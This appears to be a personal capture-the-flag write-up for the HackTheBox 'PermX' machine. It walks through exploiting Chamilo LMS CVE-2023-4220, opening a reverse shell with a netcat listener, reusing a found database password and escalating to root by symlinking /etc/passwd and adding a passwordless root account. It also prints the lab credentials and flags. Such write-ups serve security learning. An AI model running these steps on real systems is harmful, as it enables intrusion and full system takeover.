**Target:**
```php
10.10.11.23
```

Nmap reveals port 80 with a webpage.

Gobuster doesn't find any directories so i try a subdomain search and find `lms`

I add both addresses to the host file:
`permx.htb` and `lms.perx.htb`

This takes me to a login page.

Wappalyzer shows php as one of the services as well as apache which lines up with the namp scan. 

I try telling the app that i lost my password for user admin, which gives me a possible username:
`This platform was unable to send the email. Please contact [Davis Miller](mailto:admin@permx.htb) for more information.`

Find robot.txt with gobuster on the lms subdomain

```php
# robots.txt
User-Agent: *
# Directories
Disallow: /app/
Disallow: /bin/
Disallow: /documentation/
Disallow: /home/
Disallow: /main/
Disallow: /plugin/
Disallow: /tests/
Disallow: /vendor/
# Files
Disallow: /license.txt
Disallow: /README.txt
Disallow: /whoisonline.php
Disallow: /whoisonlinesession.php
```


Administrator : [Davis Miller](mailto:admin@permx.htb)
[Powered by Chamilo](http://lms.permx.htb/) © 2024

**/documentation:**
Chamilo 1.11 - Documentation

Exploits:
https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS

https://starlabs.sg/advisories/23/23-4220/

I check the vulnerable path to see if it exposes any files:

http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/

![[Pasted image 20240831123247.png]]

Exploit test:

```php
python3 main.py -u http://lms.permx.htb/ -a scan
```

netcat 

```php
rlwrap nc -nlvp 45888
```

Webshell
```php
python3 main.py -u http://lms.permx.htb/chamilo -a revshell
```

Usage:
- Start nc chosen port `rlwrap nc -nlvp 45888`
- Shell option 1 -> fem-rev.php
- Shell option 2 -> fem-rev.sh
- Enter my IP
- Enter my port 

_I can't remember if i took away the `/chamilio`, just bare that in mind if it's not working, and try to change it if needed._

I transfer `pspy` and `linpeas.sh` to the WebServer.

LIN
Linux version 5.15.0-113-generic

Active Ports
127.0.0.1:3306

User
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
mtz 10.10.14.40

/etc/mysql/mariadb.cnf

/tmp/tmux-33
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions

FTP_PASSWORD=gaufrette

/usr/share/php7.4-common/common/ftp.ini

/etc/skel/.bashrc

/var/www/chamilo/main/inc/lib/javascript/bigupload/files/webshell.php
/var/www/chamilo/main/inc/lib/javascript/bigupload/files/revshell.sh

![[Pasted image 20240914073925.png]]

==03F6lY3uXAP2bkW8==

Loos like the pass is for the maria-db, but i'll also try it with the user that we found.

mtz:03F6lY3uXAP2bkW8

I'm able to login as mtz with the password we found, in the home dir is the user.txt.

Flag:
f215079744b950e656c51ffb5225c2ba

![[Pasted image 20240914074553.png]]

The script lets me give read write execute permissions so:

- Link /etc/passwd 

```php
ln -s /etc/passwd /home/mtz/<NEW-FILE>
```

- Run the script

```php
sudo /opt/acl.sh mtz rw /home/mtz<FILE>
```

- Add new root user with a text editor

example

```php
root:x:0:0:root:/root:/bin/bash
```

Add new root account with no password

```php
zod::0:0:zod:/root:/bin/bash
```

Flag:
0bd2698d4d4195bb84ff4b3d78a67153

